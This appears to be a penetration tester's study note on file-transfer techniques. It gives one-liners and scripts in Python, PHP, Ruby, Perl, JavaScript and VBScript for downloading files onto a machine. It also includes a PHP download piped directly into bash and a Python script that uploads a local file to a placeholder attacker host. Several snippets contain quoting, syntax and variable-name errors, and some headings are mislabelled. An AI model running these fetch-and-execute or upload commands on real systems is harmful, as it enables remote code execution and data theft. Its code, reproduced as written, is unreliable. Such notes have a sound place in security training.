
- Its common to find different programming languages installed on the machines.
- Programming language such as Python, PHP, Perl and Ruby are commonly available in Linux Distribution. It can also be installed on Windows.
- `cscript` and `mshta` can be used to execute JavaScript or VBScript code on Windows.


- ## Python

	- ### Python 2.7:

		- `python2.7 -c "import urllib;urllib.urlretrieve("URL/file_name", "download_file_name")"`

	- ###  Python3:

		-  `python3 -c "import urllib.request;urllib.request.urlretrieve("URL/file_name", "download_file_name")"`

- ##  PHP

	- PHP is also very prevalent and provides multiple file transfer methods
	- Module use to get the file:
	
		- ==file_get_contents()==+==file_put_contents()==
	
	- ### PHP Download with File_get_contents()
		
		- `php -r '$file = file_get_contents("<URL>"); file_put_contents("<file_name>", $file);'`  
	
	- ###  fopen() alternative to file_get_contents() & file_put_contents() 
		
		-  `php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb")' $flocal = fopen("<file_name>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`
	
	- ### PHP Download a file and Pipe it to Bash:
	
		-  `php -r '$lines @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`

# Other Language

- ### Ruby - Download a File:
	
	- `ruby -e 'require "net/http"; File.write("<file_name>", Net::HTTP.get(URI.parse("<URL>")))'`

- ### Perl - Download a File
	
	-` perl -e 'use LWP::Simple; getstore("<URL>", "file_name");'`
	

# JavaScript

- JavaScript is a scripting or programming language that allows to implement complex features on web pages.

- The following code will work as wget which retrieve file from internet.

	`Code: wget.js`

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Download a File Using JavaScript and cscript.exe 

- ###### PowerShell Commands:

	- `cscript.exe /nologo wget.js <URL> <saved_file_name>`

# VBScript

- VBScript ==(Microsoft Visual Basic Scripting Edition)== is an Active Scripting language developed by Microsoft that is modeled on Visual Basic.

- VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

	`Code: wget.vbs`

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Download a File Using JavaScript and cscript.exe 

- ###### PowerShell Commands:

	- `cscript.exe /nologo wget.vbs <URL> <file_name>`

# Upload Operations using python3

#### Uploading a File Using a Python One-liner

- `python3 -c 'import requests;requests.post("http://<Ip>:<port>/upload",files={"files":open("<file_path>","rb")})'`

Code: python

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://<IP>:<port>/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("<file_path>","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

This the code that shows how the above command works.

[[File Transfer]]